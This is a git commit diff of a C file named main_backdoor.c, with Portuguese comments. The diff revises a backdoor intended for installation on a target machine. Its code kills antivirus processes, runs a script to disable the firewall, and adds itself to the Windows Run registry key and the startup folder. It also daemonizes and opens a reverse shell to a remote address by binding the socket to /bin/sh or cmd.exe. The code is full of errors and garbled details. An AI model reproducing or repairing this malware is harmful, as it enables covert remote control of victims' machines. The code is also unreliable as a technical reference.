9b34ab237e213d5f965aa6a7fa2e088707206b20
unknow <rmdero_jr_@outlook.com>
2018-05-26 15:56:41 -0300

    FIxing some true bugs.
    These do the work very well

--- main_backdoor.c
+++ main_backdoor.c
@@ -1,13 +1,12 @@
-/*
-Esse é o lado "cliente". Programa qúe será instalado na máquina alvo, com o servidor na monitoria.
+/* Esse é o lado "cliente". Programa qúe será instalado na máquina alvo, com o servidor na monitoria.
 
 Podendo mandar e receber arquivos, ativar keylogger, e mudar o proxy da máquina.
 
-JÁ PRONTOS: desativar anti-virus e firewallro
+JÁ PRONTOS: desativar anti-virus e firewall
             copiar-se para o registro
             copiar-se para o menu iniciar
 
-terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
+terraquian date: 4/5/20178 - 0415:55 -PM *** in desenvolpment.
 
 // use without abuse.
 
@@ -17,13 +16,11 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
 */
 
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <signal.h>
 #include <unistd.h>
 #include <string.h>
-#include <err.h>
 #include <errno.h>
 #include <string.h>
 #include <arpa/inet.h>
@@ -33,68 +30,65 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 #include <X11/Xlib.h>
 
 #define remote_addr "127.0.0.1"
-#define remote_port 2222
+#define remote_port 3389
 
 #define false 0
 #define true 1
 
-#define bytes 4096
-
-#define unsecret "0011010101"
 
 /* struct of configurations to target. */
 
   typedef struct {
 
-  char REMOTE_ADDR; 
-  int REMOTE_PORT;
-  char commands[bytes];
+  char REMOTE_ADDR; /*remote_addr */
+  int REMOTE_PORT; /* remote port */
   int x;
-  //FILE *filecmd;
 
   } Target;
 
-  int x = true;
+  x = true;
 
-  void
-  error (char *err)
+  void error (char *err)
 
   {
 
   perror(err);
-  exit(EXIT_FAILURE);
+  exit(EXIT_SUCCESS);
+  return;
 
-  } 
+  } /* return without exceptions... and keep the routine.
 
-  //function  to disable antivirus. /
 
-  void
-  kill_antivirus()
+  //function  to disable antivirus. */
+
+  void kill_antivirus()
 
   {
+
      FILE *arq;
 
     arq = fopen("av.txt", "rb");
     if(arq == NULL)
         return;
-    if(( dup2(x,0)),dup2(x,1));
-       execve("TASKLIST /FI 'STATUS eq RUNNING'", 0, 0);
-       send(x,"Killing anti virus...\n",31,0);
-       execve("TASKKILL /F /IM \\{}\\ '>> NUL'", 0, 0);
+    else
+    dup2(x,0),dup2(x,1);
 
-       return;
+   execve("TASKLIST /FI 'STATUS eq RUNNING'", 0, 0);
+   send(x,"Killing anti virus...\n",31,0);
+   execve("TASKKILL /F /IM \{}\ '>> NUL'", 0, 0);
+
+   return;
 
 
    }
 
 /* in this, i use a .vbs file, and invoked from execve(); */
 
-  void
-  kill_firewall()
+  void kill_firewall()
 
   {
 
-   dup2(x,0);
+   dup2(x, 0);
    execve("firewall.vbs", 0, 0);
 
    return;
@@ -103,103 +97,50 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
   // function that auto copy the software into the register of target machine
 
-  void
-  auto_copy()
+  void auto_copy()
 
   {
 
      dup2(x, 0);
 
-     execve("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /v wins32 /d C:/wopnt.exe",0,0);
+     execve("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /v wins32 /d C:/wins32.exe",0,0);
      return;
 
   }
 
-  void
-  copy_to_registry()
+  void copy_to_registry()
 
   {
 
     dup2(x, 0);
     dup2(x,1);
 
-    execve("copy /Y wopnt.exe C:\\Documents and Settings\\All Users\\Menu Iniciar\\Programas\\Inicializar", 0, 0);
-    execve("cp wopnt.exe /usr",NULL,NULL); /* for  linux systems, probably will failed... */
+    execve("copy /Y wins32.exe C:\\Documents and Settings\\All Users\\Menu Iniciar\\Programas\\Inicializar", 0, 0);
+    execve("cp wins32.exe /usr",NULL,NULL); /* for  linux systems, probably will failed... */
 
     return;
-
-
-    void
-    background_life();
-
-    {
-
-    XFreeCursor; //magic happens here
-
-    pid_t pid;
-
-	pid = fork();
-
-	if(pid < 0 )
-        exit(EXIT_FAILURE);
-
-    if(pid > 0)
-        exit(EXIT_SUCCESS);
-
-    else (setsid() < 0);
-        exit(EXIT_FAILURE);
-
-        signal(SIGCHLD, SIG_IGN);
-        signal(SIGHUP, SIG_IGN);
-
-        pid = fork();
-
-        if (pid < 0)
-            exit(EXIT_FAILURE);
-
-        if (pid > 0)
-            exit(EXIT_SUCCESS);
-
-        /* hidden in all the ways */
-
-        sigmask(0x01);
-        chdir("/, C:\\, C:\\Windows\\System32,F:\\,G:\\,D:\\,E:\\,H:\\");
-
-        }
-
-        int k;
-
-        for (k = sysconf(_SC_OPEN_MAX); k >= false; k--)
-
-
-        {
-
-
-        close(k);
-
-
-        }
-
-
-    return;
-
   }
 
-  void
-  shell()
+
+  /*função para o programa rodar em background, como uma daemon
+
+
+   create connection */
+
+  void shell()
 
   {
-    int  x;
+
     struct sockaddr_in s;
     int root;
-    char command[bytes];
     char *window[] = { "HOME=/usr/home", "LOGNAME=home", (char *)0 };
     char *cmd[] = { "/bin/sh", (char *)0 };
 
-    XFreeCursor; //magic happens here
+   /* the daemon thing... */
+
+    XFreeCursor;
 
     pid_t pid;
-
 	pid = fork();
 
 	if(pid < 0 )
@@ -223,6 +164,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
             exit(EXIT_SUCCESS);
 
         sigmask(0);
+
         chdir("/, C:\\, C:\\Windows\\System32");
 
         int k;
@@ -232,144 +174,106 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
         {
             close(k);
 
-        /* daemon implanted. */
-
     /* setting up the connection */
 
-     memset(s.sin_zero, '\0', sizeof s.sin_zero);
+     memset(s.sin_zero, '\0', sizeof s.sin_zero); /*aloca espaço de memória para o PIPE socket. */
      s.sin_family = AF_INET; /* família de protocolos */
      s.sin_addr.s_addr = inet_addr(remote_addr);
      s.sin_port = htons(remote_port);
-     malloc(sizeof (x));
 
      x = socket(AF_INET, SOCK_STREAM, 0); /* create a socket */
 
     /* sleep(120);  if connection are slow... sleep for 60x2 sec untill made the connection
                    discomment this if u think necessary... */
 
+
+    /* when connection arrives, i've got the backdoor control. */
+
      (connect(x, (struct sockaddr *)&s, sizeof(s)));
-     if (connect == 0x0)
+     if (connect == -1)
      perror("socket(SOCKET_CONNECT)connect_failed");
 
      if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
      perror("setsockopt(SO_REUSEADDR)failed");
 
-     /* fck, now  i have power!
+     /* don't freeze the memory, dude */
+
+     sleep(5); /* sleep for 5 sec */
+
+     /*enter in a shell, finally */
+
+    /* anyway, here are where the conditions come... */
+
+    /* fck, now  i have power!
+
       made conditions here. */
-     if(recv(x,command,bytes,0) == true)
-//     backdoor_connect();
-     send(x,"\n...\n **\n ** backdoor loaded...",33,0), send(x,"\n Connected in machine \n\n",25,0);
 
-     //handle with the impossible errors.
-
-     if(recv(x,command,bytes,0)  < 0);
-     perror("Connection failed:"); //
-
-     if(connect == 0x0)
+     send(x,"\nsocket created\n",18,0), send(x,"\nConnected in machine\n",22,0);
+     if(connect == -1)
      perror("BREAK CONNECTION,(failure)");
-
      else
 
-     if(recv(x,command,bytes,0) > 0);
+     send(x,"\n#root > /n",7,0);
+     /*fflush(stdout);  DON'T! */
 
-   //  XFreeCursor;
      dup2(x, 0),dup2(x, 1),dup2(x, 2);
      root = execve("/bin/sh", cmd,  window),execve("C:\\windows\\System32\\cmd.exe ", cmd, window),execve("netcat", cmd, window);
 
-     return;
+     while(true);
+
 
      }
 
+
 }
+
      /* execute the program */
 
      int main(int argc, char **argv)
 
      {
-      
-      char command[bytes], bufaux[bytes], *loc;
-      int tbuf, escolha;
-      char comandos[]="/shell /help";
-      struct sockaddr_in s;
 
      {
 
-        /* setting up the connection */
+      /* this is generic */
 
-     x = socket(AF_INET, SOCK_STREAM, 0); 
-
-     memset(s.sin_zero, '\0', sizeof s.sin_zero);
-     s.sin_family = AF_INET; 
-     s.sin_addr.s_addr = inet_addr(remote_addr);
-     s.sin_port = htons(remote_port);
-     malloc(sizeof (x));
-
-    /* sleep(120);  if connection are slow... sleep for 60x2 sec untill made the connection
-                   discomment this if u think necessary... */
-
-     (connect(x, (struct sockaddr *)&s, sizeof(s))); {
-     if (accept == 0x0)
-     perror("socket(SOCKET_CONNECT)connect_failed");
-     }
-
-     {
-
-     if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
-     perror("setsockopt(SO_REUSEADDR)failed");
-
-     }
-     do
-     {
-     // send msg to server 
-     strcpy(command,"\n...\n $$ Backdoor connected \n\n~$ ");
-     strcpy(bufaux,command);
-     send(x,command,strlen(command), 0);
-
-    // Recv ack from controller
-     tbuf = recv(x, command,4096, 0);
-     command[tbuf]=0x00;
-     //fprintf(stdout,">: %s\n",command);
-
-    } while((tbuf=recv(x,command,4096,0) > 0));
-     command[tbuf]=0x00;
-
-     if (strncmp(command,"/",1) == 0)
-
-     {
-
-        loc = strstr(comandos,command);
-        escolha = loc - comandos;
+      if(auto_copy == false)
+      perror("error in auto_copy");
+      else
+           auto_copy();
+      if(copy_to_registry == false)
+      perror("error copying to registry");
+      else
+          copy_to_registry();
+      if(kill_antivirus == false)
+      perror("kill anti virus failed...");
+      else
+          kill_antivirus();
+      if(kill_firewall == false)
+      perror("kill firewall failed... retrying");
+      else
+          kill_firewall();
+      sleep(0.2);
 
       }
 
-   switch(escolha)
+      /*shell run while the connection for true */
 
-   {
+      do {
 
-     case 1:
-
-     shell();
-     break;
-
-     case 2:
-    
-     kill_antivirus();
-     break;
-
-     case 3:
-
-     kill_firewall();
-     break;
-		   
-     default:
-             main;
-
-          }
-
+      shell();
 
       }
 
-     while(true);
+
+      while (connect == (true));
 
 
-}
+      {
+
+
+    }
+
+
+
+ }
